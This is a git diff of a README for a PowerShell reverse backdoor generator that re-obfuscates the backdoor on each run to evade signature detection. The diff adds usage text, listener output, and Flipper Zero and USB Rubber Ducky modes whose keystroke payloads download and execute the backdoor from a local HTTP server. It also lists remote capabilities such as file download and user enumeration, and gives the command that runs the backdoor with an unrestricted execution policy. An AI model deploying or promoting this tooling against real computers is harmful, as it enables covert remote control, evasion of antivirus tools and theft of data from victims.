@@ -1,10 +1,44 @@
 # powershell-backdoor
 Reverse Backdoor written in Powershell and obfuscated with python. Allowing the backdoor to have a new signature after every run.
+```
+usage: listen.py [-h] [--ip-address IP_ADDRESS] [--port PORT] [--random] [--out OUT] [--verbose] [--delay DELAY]
+                 [--flipper FLIPPER] [--ducky] [--server-port SERVER_PORT] [-k KEYBOARD]
+
+Powershell Backdoor Generator
+
+options:
+  -h, --help            show this help message and exit
+  --ip-address IP_ADDRESS, -i IP_ADDRESS
+                        IP Address to bind the backdoor too (default: 192.168.0.223)
+  --port PORT, -p PORT  Port for the backdoor to connect over (default: 4444)
+  --random, -r          Randomizes the outputed backdoor's file name
+  --out OUT, -o OUT     Specify the backdoor filename (relative file names)
+  --verbose, -v         Show verbose output
+  --delay DELAY         Delay in milliseconds before Flipper Zero/Ducky-Script payload execution (default:100)
+  --flipper FLIPPER     Payload file for flipper zero to connect to the http server (includes EOL conversion)
+                        (relative file name)
+  --ducky               Creates an inject.bin for the http server
+  --server-port SERVER_PORT
+                        Port to run the HTTP server on (--server) (default: 8989)
+  -k KEYBOARD, --keyboard KEYBOARD
+                        Keyboard layout for Bad Usb/Flipper Zero (default: us)
+```
+# Quick Links
+* [Preview](#preview)
+* [Features](#features)
+* [Standard Backdoor](standard-backdoor)
+* [Flipper Zero Backdoor](flipper-zero-backdoor)
+* [USB Rubber Ducky Backdoor](usb-rubber-ducky-backdoor)
+* [Thanks](#thanks)
+* [To Do](#to-do)
 
 ## Preview
-![preview](preview.PNG)
+![preview](/images/preview.PNG)
 <br>
+
 ## Features
+* Hak5 Rubber Ducky payload
+* Flipper Zero payload
 * Download Files from remote system
 * Fetch target computers public IP address
 * List local users
@@ -15,15 +49,35 @@ Reverse Backdoor written in Powershell and obfuscated with python. Allowing the 
 * Get Active TCP Clients
 * Checks for common pentesting software installed
 
-## Setup
-Don't change the code inside template.ps1, instead run listen.py
-```
-PS C:\Users\DrewQ\Desktop> python .\listen.py --verbose
+## Standard backdoor
+``` bash
+C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --verbose
 [*] Encoding backdoor script
-[*] Saved backdoor backdoor.ps1 sha1:02cf166bbe6fdf8f3db4d3e6d04e5e2cf8b98a6b
-[*] Starting Backdoor Listener 192.168.0.223:4444
+[*] Saved backdoor backdoor.ps1 sha1:32b9ca5c3cd088323da7aed161a788709d171b71
+[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
 ```
-No arguments are required, backdoor.ps1 will be dropped in the current working directory.
+A file in the current working directory will be created called backdoor.ps1
+
+## Flipper Zero Backdoor
+```
+C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --flipper powershell_backdoor.txt
+[*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1
+[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
+```
+Place the text file you specified (e.g: powershell_backdoor.txt) into your flipper zero. When the payload is executed 
+it will download and execute backdoor.ps1
+
+## Usb Rubber Ducky Backdoor
+```
+ C:\Users\DrewQ\Desktop\powershell-backdoor-main> python .\listen.py --ducky
+[*] Started HTTP server hosting file: http://192.168.0.223:8989/backdoor.ps1
+[*] Starting Backdoor Listener 192.168.0.223:4444 use CTRL+BREAK to stop
+```
+A file named inject.bin will be placed in your current working directory. Java is required for this feature. When the payload is executed 
+it will download and execute backdoor.ps1
+
+## Thanks
+To encode payload.txt into inject.bin for USB Rubber Ducky Attacks I use encoder.jar created by ![midnitesnake](https://github.com/midnitesnake).
 
 ## Backdoor Execution
 Tested on Windows 11, Windows 10 and Kali Linux
@@ -39,7 +93,6 @@ powershell.exe -File backdoor.ps1 -ExecutionPolicy Unrestricted
 * Add Standard Backdoor
 * Find Writeable Directories
 * Get Windows Update Status
-* USB Rubber Ducky Support
 
 ## Output of 5 obfuscations/Runs 
 ```
